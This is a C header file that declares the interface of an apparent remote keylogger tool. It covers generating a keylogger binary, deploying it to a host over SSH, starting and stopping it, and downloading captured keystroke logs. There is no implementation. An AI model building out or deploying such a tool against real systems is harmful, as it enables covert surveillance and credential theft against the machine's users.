#ifndef KEYLOGGER_H
#define KEYLOGGER_H

#include "ssh_utils.h"

typedef struct {
    int running;
    char logfile[256];
    ssh_session session;
    pthread_t thread;
} keylogger_data_t;

const char* generate_keylogger_binary(void);
int deploy_remote_keylogger(ssh_session session, const char *remote_logfile);
int stop_remote_keylogger_process(ssh_session session);
void start_remote_keylogger(keylogger_data_t *data, ssh_session session, const char *remote_logfile);
void stop_remote_keylogger(keylogger_data_t *data);
int download_keylogs(keylogger_data_t *data, const char *local_path);

#endif // KEYLOGGER_H
